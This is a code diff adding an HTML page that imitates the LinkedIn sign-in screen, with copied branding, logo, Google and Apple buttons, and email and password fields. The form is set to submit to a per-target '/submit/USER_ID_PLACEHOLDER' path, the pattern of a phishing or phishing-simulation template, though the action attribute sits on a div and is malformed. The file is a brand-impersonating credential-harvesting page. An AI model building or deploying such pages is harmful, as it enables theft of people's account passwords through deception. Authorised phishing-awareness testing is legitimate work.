@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn: Log In or Sign Up</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
+        }
+        body {
+            background-color: #f3f2ef;
+            color: rgba(0, 0, 0, 0.9);
+            line-height: 1.5;
+            min-height: 100vh;
+        }
+        .nav {
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+        }
+        .main-container {
+            max-width: 1128px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        @media (min-width: 768px) {
+            .main-container {
+                flex-direction: row;
+                align-items: center;
+                padding-top: 40px;
+            }
+        }
+        .hero-section {
+            margin-bottom: 24px;
+            flex: 1;
+        }
+        .hero-heading {
+            font-size: 56px;
+            color: #8f5849;
+            font-weight: 200;
+            line-height: 1.2;
+            margin-bottom: 16px;
+        }
+        .login-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 24px;
+            max-width: 416px;
+            width: 100%;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: rgba(0, 0, 0, 0.75);
+            padding: 0 0 4px 0;
+        }
+        .input-field {
+            width: 100%;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 4px;
+            padding: 14px 8px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .input-field:focus {
+            outline: none;
+            box-shadow: 0 0 0 1px #0a66c2;
+            border-color: #0a66c2;
+        }
+        .forgot-password {
+            display: inline-block;
+            color: #0a66c2;
+            font-weight: 600;
+            font-size: 16px;
+            margin: 16px 0;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #004182;
+        }
+        .signin-button {
+            width: 100%;
+            background-color: #0a66c2;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 24px;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        .signin-button:hover {
+            background-color: #004182;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: rgba(0, 0, 0, 0.6);
+            font-size: 14px;
+            margin: 16px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.15);
+        }
+        .divider span {
+            padding: 0 16px;
+        }
+        .google-signin {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px 16px;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            background-color: white;
+            color: rgba(0, 0, 0, 0.75);
+        }
+        .google-signin:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+        }
+        .google-signin svg {
+            margin-right: 8px;
+        }
+        .apple-signin {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px 16px;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            background-color: white;
+            color: rgba(0, 0, 0, 0.75);
+        }
+        .apple-signin:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+        }
+        .apple-signin svg {
+            margin-right: 8px;
+        }
+        .signup-link {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 16px;
+        }
+        .signup-link a {
+            color: #0a66c2;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 40px;
+            padding: 24px 0;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(0, 0, 0, 0.6);
+        }
+        .logo {
+            color: #0a66c2;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .logo svg {
+            height: 28px;
+            width: auto;
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 21" fill="currentColor" width="84" height="21">
+                <g>
+                    <path d="M12.5 2.75a1.75 1.75 0 10-3.5 0 1.75 1.75 0 003.5 0zM9 8.25A.75.75 0 009 9.75h.5v5.5a.75.75 0 001.5 0v-5.5h.5a.75.75 0 000-1.5H9zM13.25 14.5a.75.75 0 000 1.5h4.5a.75.75 0 000-1.5h-4.5zM5 9.75A.75.75 0 006.5 9v-.25h2.75a.75.75 0 000-1.5H6.5V7a.75.75 0 00-1.5 0v.25H2.75a.75.75 0 000 1.5H5V9z"></path>
+                    <path d="M3.75 10.5a.75.75 0 00-.75.75v8.5c0 .414.336.75.75.75h9.5a.75.75 0 00.75-.75v-8.5a.75.75 0 00-.75-.75h-9.5z"></path>
+                </g>
+                <path d="M34.5 1.25h-10a.75.75 0 00-.75.75v18a.75.75 0 001.5 0V2.75h9.25a.75.75 0 000-1.5zM39.5 12.75h-3V11a.75.75 0 00-1.5 0v8a.75.75 0 001.5 0v-5h3a.75.75 0 000-1.5zM45.75 10.25a.75.75 0 00-.75.75v8a.75.75 0 001.5 0v-8a.75.75 0 00-.75-.75zM45.75 7.75a.75.75 0 01-.75-.75V2.75h9.5a.75.75 0 000-1.5h-10a.75.75 0 00-.75.75v5a.75.75 0 001.5 0v-1.5a.75.75 0 01.75-.75zM52.25 10.25a.75.75 0 00-.75.75v1.5h-1.5a.75.75 0 000 1.5h1.5v4.25a.75.75 0 001.5 0v-7.25a.75.75 0 00-.75-.75zM58.25 10.25a.75.75 0 00-.75.75v8a.75.75 0 001.5 0v-8a.75.75 0 00-.75-.75zM58.25 7.75a.75.75 0 01-.75-.75V2.75h9.5a.75.75 0 000-1.5h-10a.75.75 0 00-.75.75v5a.75.75 0 001.5 0v-1.5a.75.75 0 01.75-.75zM65.25 10.25a.75.75 0 00-.75.75v8a.75.75 0 001.5 0v-8a.75.75 0 00-.75-.75zM73.75 10.25a.75.75 0 00-.75.75v5a.75.75 0 01-.75.75h-1.5V11a.75.75 0 00-1.5 0v6.5a.75.75 0 00.75.75h2.25a2.25 2.25 0 002.25-2.25v-5a.75.75 0 00-.75-.75zM79.75 16.75h-1.5v-5.5a.75.75 0 00-1.5 0v6.25a.75.75 0 00.75.75h2.25a.75.75 0 000-1.5z"></path>
+            </svg>
+        </div>
+    </nav>
+
+    <main class="main-container">
+
+        <div class="login-card">
+            <form>
+                <div class="form-group" method="post" action="/submit/USER_ID_PLACEHOLDER">
+                    <label for="email">Email or phone</label>
+                    <input type="text" id="email" class="input-field">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" class="input-field">
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button type="submit" class="signin-button">Sign in</button>
+            </form>
+
+            <div class="divider"><span>or</span></div>
+
+            <button class="google-signin">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20px" height="20px">
+                    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                    <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                    <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                    <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                </svg>
+                Sign in with Google
+            </button>
+            <button class="apple-signin">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 24 24">
+                    <path d="M16.462 17.638c-.791.805-1.635 1.522-2.912 1.538-.668.008-1.15-.195-1.614-.392-.478-.203-.94-.39-1.679-.39-.77 0-1.253.192-1.743.405-.439.19-.893.388-1.491.413-1.173.049-2.068-.722-2.909-1.58C2.568 15.799 1.658 13.242 1.657 10.977c-.001-1.97.736-3.486 1.841-4.523.834-.781 1.894-1.223 2.932-1.223.664 0 1.303.202 1.866.387.439.142.852.277 1.197.277.294 0 .689-.118 1.137-.256.639-.195 1.365-.418 2.117-.418 1.58.016 2.791.942 3.54 2.242-1.557.805-2.506 1.962-2.506 3.53 0 1.953 1.488 3.266 3.574 3.64.032.23.064.462.064.693 0 .843-.216 1.93-.957 2.913zm-5.724-15.51c.14.013.281.013.421.013.14 0 .281-.13.421-.13.519-.854.883-2.044.763-3.228-.617.1-1.235.358-1.694.805-.421.407-.788 1.042-.907 1.676-.001.041-.002.082-.002.123 0 .21.325.561.998.641z"/>
+                </svg>
+                Sign in with Apple
+            </button>
+
+            <div class="signup-link">
+                New to LinkedIn? <a href="#">Join now</a>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p>LinkedIn © 2025</p>
+    </footer>
+</body>
+</html>
